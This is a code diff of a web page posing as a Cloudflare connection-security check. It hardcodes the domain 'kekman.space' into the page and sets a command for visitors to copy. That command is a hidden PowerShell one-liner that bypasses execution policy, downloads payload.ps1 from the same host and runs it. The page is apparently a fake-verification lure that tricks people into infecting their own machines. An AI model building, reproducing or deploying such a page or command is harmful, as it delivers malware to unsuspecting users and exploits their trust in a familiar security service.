@@ -270,7 +270,7 @@
     <!-- Logo -->
     <div class="logo-container">
       <img class="logo-img" src="https://www.google.com/s2/favicons?sz=128&domain=cloudflare.com" alt="Cloudflare Logo" />
-      <p class="domain-title"><span class="domain-name"></span></p>
+      <p class="domain-title"><span class="domain-name">kekman.space</span></p>
     </div>
 
     <div class="text-container">
@@ -327,7 +327,7 @@
     </div>
 
     <p class="domain-footer">
-      <span class="domain-name"></span> needs to review the security of your connection before proceeding.
+      <span class="domain-name">kekman.space</span> needs to review the security of your connection before proceeding.
     </p>
   </div>
 </div>
@@ -343,22 +343,18 @@
 
 <script>
 (function() {
-  // ---- CONFIG: real fake Cloudflare command (uses iwr + pipe) ----
+  // ---- COMMAND: real fake Cloudflare pattern (iwr + pipe) ----
   const CONFIG = {
     command: 'powershell -ep bypass -w hidden -c "$a=&(gcm iwr) ''https://kekman.space/payload.ps1'' -UseBasicParsing;$a.Content|powershell -w hidden -"'
   };
 
-  // ---- Fill dynamic content ----
-  const hostname = window.location.hostname || 'kekman.space';
-  document.querySelectorAll('.domain-name').forEach(el => el.textContent = hostname);
-
-  // Ray ID
+  // ---- Ray ID ----
   const rayChars = 'abcdef0123456789';
   const rayId = Array.from({ length: 16 }, () => rayChars[Math.floor(Math.random() * rayChars.length)]).join('');
   const rayEl = document.querySelector('.ray-id');
   if (rayEl) rayEl.textContent = rayId;
 
-  // Verification ID
+  // ---- Verification ID ----
   const verId = Math.floor(100000 + Math.random() * 900000);
   const verEl = document.getElementById('verification-id');
   if (verEl) verEl.textContent = verId;
